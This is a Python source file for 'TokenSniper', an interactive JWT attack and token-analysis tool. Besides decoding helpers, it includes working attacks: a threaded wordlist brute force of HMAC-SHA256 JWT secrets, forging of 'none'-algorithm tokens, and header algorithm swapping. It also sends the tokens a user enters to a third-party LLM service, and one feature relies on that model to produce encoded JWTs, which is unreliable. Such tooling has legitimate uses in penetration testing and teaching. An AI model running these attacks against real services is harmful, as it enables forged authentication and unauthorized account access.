#!/usr/bin/env python3

import base64
import json
import sys
import hmac
import hashlib
import re
import threading
import os
import requests
from dotenv import load_dotenv
from queue import Queue

# Colors
GREEN = "\033[1;32m"
RED = "\033[1;31m"
BLUE = "\033[1;34m"
RESET = "\033[0m"

load_dotenv()

def banner():
    print(RED)
    print("""
████████╗ ██████╗  ██████╗ ██╗  ██╗███████╗
╚══██╔══╝██╔═══██╗██╔═══██╗██║ ██╔╝██╔════╝
   ██║   ██║   ██║██║   ██║█████╔╝ █████╗  
   ██║   ██║   ██║██║   ██║██╔═██╗ ██╔══╝  
   ██║   ╚██████╔╝╚██████╔╝██║  ██╗███████╗
   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝
           TokenSniper by Anas Education
""")
    print(GREEN + " Tool Name   : TokenSniper")
    print(" Author      : Anas Education")
    print(" YouTube     : https://www.youtube.com/@Anas_Education")
    print(" LinkedIn    : https://www.linkedin.com/in/anas-magane-3aa287262/" + RESET)

def menu():
    print("""
TokenSniper Menu:
1. Detect Token Type
2. Decode JWT
3. Deserialize Base64 Token
4. Serialize to Base64 Token
5. Encode JWT (AI Powered)
6. Brute Force JWT Secret Key
7. JWT None Algorithm Attack
8. Change JWT Algorithm
9. AI Suggestion on Token Usage
10. Exit""")

def decode_b64(data):
    try:
        data += "=" * (-len(data) % 4)
        return base64.urlsafe_b64decode(data.encode()).decode()
    except:
        return ""

def detect_token_type(token):
    print(GREEN + "[+] Analyzing token..." + RESET)
    if token.count('.') == 2:
        print(GREEN + "[+] Detected: JWT" + RESET)
        return
    try:
        decoded = decode_b64(token)
        if decoded:
            print(GREEN + "[+] Detected: Base64-encoded" + RESET)
            print(GREEN + "[+] Decoded Value: " + decoded + RESET)
            return
    except:
        pass
    if re.fullmatch(r"[a-fA-F0-9]{32}", token):
        print(GREEN + "[+] Detected: HEX token (likely API key)" + RESET)
        return
    if re.fullmatch(r"[0-9a-fA-F\-]{36}", token):
        print(GREEN + "[+] Detected: UUID token" + RESET)
        return
    print(RED + "[-] Unknown or Unsupported Token Type." + RESET)

def decode_jwt(token):
    try:
        header, payload, signature = token.split(".")
        print(GREEN + "[+] Header:" + RESET)
        print(json.dumps(json.loads(decode_b64(header)), indent=4))
        print(GREEN + "[+] Payload:" + RESET)
        print(json.dumps(json.loads(decode_b64(payload)), indent=4))
        print(GREEN + "[+] Signature:" + RESET)
        print(signature)
    except Exception as e:
        print(RED + f"[-] JWT decode error: {e}" + RESET)
def encode_jwt_ai():
    try:
        print(GREEN + "[*] Enter JWT Header in JSON format:" + RESET)
        header = input()

        print(GREEN + "[*] Enter JWT Payload in JSON format:" + RESET)
        payload = input()

        print(GREEN + "[*] Enter JWT Signature or leave blank for unsigned:" + RESET)
        signature = input().strip()

        # Format the prompt clearly for AI
        prompt = (
            f"Generate a JWT token using the following:\n\n"
            f"Header:\n{header}\n\n"
            f"Payload:\n{payload}\n\n"
            f"Signature:\n{signature if signature else 'No signature'}\n\n"
            f"Return only the encoded JWT in the format: <header>.<payload>.<signature>\n"
        )

        response = requests.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers={
                "Authorization": f"Bearer {os.getenv('GROQ_API_KEY')}",
                "Content-Type": "application/json"
            },
            json={
                "model": "meta-llama/llama-4-scout-17b-16e-instruct",
                "messages": [{"role": "user", "content": prompt}],
                "temperature": 0.2,
                "max_tokens": 100
            },
            timeout=30
        )

        data = response.json()

        if "choices" in data and data["choices"]:
            jwt_result = data["choices"][0]["message"]["content"].strip()
            print(GREEN + "[+] Encoded JWT:" + RESET)
            print(jwt_result)
        else:
            print(RED + "[-] AI-JWT Encoding error: No valid response from AI." + RESET)

    except Exception as e:
        print(RED + f"[-] AI-JWT Encoding error: {e}" + RESET)
def none_algo_attack():
    try:
        token = input("Enter a JWT token: ").strip()
        header, payload, _ = token.split(".")

        # Change alg to 'none'
        new_header = json.loads(decode_b64(header))
        new_header['alg'] = 'none'
        header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip("=")

        # Construct new token with empty signature
        new_token = f"{header_b64}.{payload}."
        print(GREEN + "[+] Forged JWT using 'none' algorithm:" + RESET)
        print(new_token)
    except Exception as e:
        print(RED + f"[-] None Algorithm Attack error: {e}" + RESET)

def brute_force(token, wordlist_path, threads=10):
    try:
        header, payload, signature = token.split(".")
        header_payload = f"{header}.{payload}".encode()

        with open(wordlist_path, "r", encoding="latin-1", errors="ignore") as f:
            words = [line.strip() for line in f if line.strip()]

        print(GREEN + f"[+] Loaded {len(words)} words from wordlist." + RESET)

        q = Queue()
        for word in words:
            q.put(word)

        found_flag = [False]

        def brute_worker_local():
            while not q.empty():
                word = q.get()
                if found_flag[0]:
                    q.task_done()
                    return
                try:
                    expected_sig = hmac.new(word.encode(), header_payload, hashlib.sha256).digest()
                    expected_sig_b64 = base64.urlsafe_b64encode(expected_sig).decode().rstrip("=")
                    if expected_sig_b64 == signature:
                        print(GREEN + f"\n[+] Secret found: {word}" + RESET)
                        found_flag[0] = True
                        return
                except Exception:
                    pass
                q.task_done()

        for _ in range(threads):
            threading.Thread(target=brute_worker_local, daemon=True).start()

        while not q.empty() and not found_flag[0]:
            print(BLUE + f"[i] Remaining: {q.qsize()}..." + RESET, end="\r")

        q.join()

        if not found_flag[0]:
            print(RED + "\n[-] Secret key not found." + RESET)

    except Exception as e:
        print(RED + f"[-] Brute force failed: {e}" + RESET)
def serialize_to_base64():
    try:
        print(GREEN + "[*] Enter data in JSON format to encode to base64:" + RESET)
        data = input().strip()
        obj = json.loads(data)
        encoded = base64.urlsafe_b64encode(json.dumps(obj).encode()).decode().rstrip("=")
        print(GREEN + "[+] Serialized Base64 Token:" + RESET)
        print(encoded)
    except Exception as e:
        print(RED + f"[-] Base64 serialization error: {e}" + RESET)

def ai_token_suggestion():
    try:
        token = input("Enter a JWT or base64 token: ")

        prompt = f"""You are a cybersecurity AI assistant.
Analyze the following token and provide:
- Token type (JWT / Base64 / Unknown)
- Structure analysis (header, payload, signature)
- Security issues if any
- Possible usage or attacks
Token:
{token}
"""

        response = requests.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers={
                "Authorization": f"Bearer {os.getenv('GROQ_API_KEY')}",
                "Content-Type": "application/json"
            },
            json={
                "model": "meta-llama/llama-4-scout-17b-16e-instruct",
                "messages": [{"role": "user", "content": prompt}],
                "temperature": 0.5,
                "max_tokens": 500
            },
            timeout=30
        )

        data = response.json()
        output = data["choices"][0]["message"]["content"].strip()
        print(GREEN + "[+] AI Suggestion:" + RESET)
        print(BLUE + output + RESET)

    except Exception as e:
        print(RED + f"[-] AI Token Suggestion error: {e}" + RESET)

def change_jwt_algorithm():
    try:
        token = input("Enter JWT token: ").strip()
        new_alg = input("Enter new algorithm (e.g. HS256): ").strip()
        
        header, payload, signature = token.split(".")
        header_json = json.loads(decode_b64(header))
        header_json["alg"] = new_alg

        new_header_b64 = base64.urlsafe_b64encode(json.dumps(header_json).encode()).decode().rstrip("=")
        new_token = f"{new_header_b64}.{payload}.{signature}"

        print(GREEN + f"[+] JWT with modified alg='{new_alg}':" + RESET)
        print(new_token)
    except Exception as e:
        print(RED + f"[-] Change JWT Algorithm error: {e}" + RESET)
def deserialize_base64_token():
    try:
        print(GREEN + "[*] Enter base64-encoded string to decode:" + RESET)
        b64_input = input().strip()
        padded = b64_input + '=' * (-len(b64_input) % 4)
        decoded = base64.urlsafe_b64decode(padded.encode()).decode()
        json_obj = json.loads(decoded)
        print(GREEN + "[+] Decoded JSON:" + RESET)
        print(json.dumps(json_obj, indent=4))
    except Exception as e:
        print(RED + f"[-] Base64 deserialization error: {e}" + RESET)

def main():
    banner()
    while True:
        menu()
        choice = input(">>> Your Choice: ").strip()
        if choice == "1":
            token = input("Enter the token: ")
            detect_token_type(token)
        elif choice == "2":
            token = input("Enter the JWT: ")
            decode_jwt(token)
        elif choice == "3":
            deserialize_base64_token()
        elif choice == "4":
            serialize_to_base64()
        elif choice == "5":
            encode_jwt_ai()
        elif choice == "6":
            token = input("Enter JWT to crack: ")
            wordlist = input("Enter wordlist path: ")
            brute_force(token, wordlist)
        elif choice == "7":
            none_algo_attack()
        elif choice == "8":
            change_jwt_algorithm()
        elif choice == "9":
            ai_token_suggestion()
        elif choice == "10":
            print(GREEN + "Goodbye!" + RESET)
            break
        else:
            print(RED + "[-] Invalid choice. Try again." + RESET)


if __name__ == "__main__":
    main()